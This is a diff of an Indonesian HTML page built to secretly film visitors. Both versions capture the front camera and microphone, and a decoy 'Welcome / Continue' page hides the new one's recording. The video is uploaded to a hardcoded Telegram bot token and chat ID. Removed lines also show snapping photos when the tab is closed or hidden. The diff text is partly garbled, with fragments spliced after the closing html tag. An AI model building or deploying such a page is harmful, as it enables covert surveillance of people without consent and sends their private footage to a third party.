@@ -3,112 +3,97 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Rekam Video 1 Menit & Kirim ke Telegram</title>
+  <title>Rekaman Background</title>
   <style>
     body {
       margin: 0;
       height: 100vh;
+      background: url('https://files.catbox.moe/c7fi9o.png') no-repeat center center/cover;
       display: flex;
       justify-content: center;
       align-items: center;
-      background: #000;
-      overflow: hidden;
-      color: #0f0;
-      font-family: sans-serif;
       flex-direction: column;
+      font-family: sans-serif;
+      color: #fff;
     }
-    video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
+    h1 {
+      font-size: 36px;
+      margin-bottom: 20px;
+      text-shadow: 2px 2px 4px #000;
     }
-    #status {
-      position: absolute;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(0,0,0,0.5);
-      padding: 10px 20px;
-      border-radius: 10px;
+    button {
+      padding: 12px 30px;
       font-size: 18px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      margin: 10px;
+      background: rgba(0,0,0,0.6);
+      color: #0f0;
+      text-shadow: 1px 1px 2px #000;
+      transition: 0.3s;
+    }
+    button:hover {
+      background: rgba(0,0,0,0.8);
     }
   </style>
 </head>
 <body>
-  <div id="status">📹 Merekam video...</div>
-  <video id="video" autoplay playsinline></video>
+
+  <h1>Selamat Datang</h1>
+  <button id="startBtn">Lanjutkan</button>
+  <button id="stopBtn">Kembali</button>
+
+  <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
     const BOT_TOKEN = "8223984259:AAHsAazlUhvE4LOCfzSR1Ty-CAa38X7svjk";
     const CHAT_ID = "7412613560";
 
-    async function startRecording() {
-      try {
-        const video = document.getElementById('video');
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-        video.srcObject = stream;
-        video.play();
+    let recorder, chunks = [], stream;
 
-        // Rekam video 1 menit
-        const recorder = new MediaRecorder(stream);
-        let chunks = [];
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const canvas = document.getElementById('canvas');
+
+    startBtn.addEventListener('click', async () => {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        recorder = new MediaRecorder(stream);
+        chunks = [];
 
         recorder.ondataavailable = e => chunks.push(e.data);
-
-        recorder.onstop = async () => {
-          const blob = new Blob(chunks, { type: "video/webm" });
-          const formData = new FormData();
-          formData.append("chat_id", CHAT_ID);
-          formData.append("video", blob, "rekaman1menit.webm");
-
-          try {
-            document.getElementById('status').innerText = "⏳ Mengirim video ke Telegram...";
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-              method: "POST",
-              body: formData
-            });
-            document.getElementById('status').innerText = "✅ Video berhasil dikirim!";
-          } catch (err) {
-            document.getElementById('status').innerText = "❌ Gagal mengirim video.";
-            console.error(err);
-          }
-        };
-
         recorder.start();
-
-        // Stop rekaman setelah 1 menit (60000 ms)
-        setTimeout(() => {
-          recorder.stop();
-          // hentikan kamera
-          stream.getTracks().forEach(track => track.stop());
-        }, 60000);
-
-      } catch (err) {
-        console.error("Gagal mengakses kamera/mikrofon:", err);
-        document.getElementById('status').innerText = "❌ Tidak bisa mengakses kamera/mikrofon";
-      }
-    }
-
-    startRecording();
-  </script>
-</body>
-</html>        } catch (err) {
-          console.error("Gagal kirim foto:", err);
-        }
-      }, 'image/jpeg', 0.9);
-    }
-
-    // kirim saat user menutup halaman/tab
-    window.addEventListener('beforeunload', captureAndSend);
-
-    // tambahan: kirim juga saat tab tidak terlihat / pindah tab
-    document.addEventListener('visibilitychange', () => {
-      if (document.visibilityState === 'hidden') {
-        captureAndSend();
+      } catch(err) {
+        console.error("Tidak bisa mengakses kamera/mikrofon:", err);
       }
     });
 
-    startCamera();
+    stopBtn.addEventListener('click', async () => {
+      if(recorder && recorder.state !== 'inactive') {
+        recorder.stop();
+      }
+      if(stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+
+      recorder.onstop = async () => {
+        const blob = new Blob(chunks, { type: "video/webm" });
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("video", blob, "rekaman.webm");
+
+        try {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            method: "POST",
+            body: formData
+          });
+        } catch(err) {
+          console.error("Gagal mengirim video:", err);
+        }
+      };
+    });
   </script>
+
 </body>
 </html>
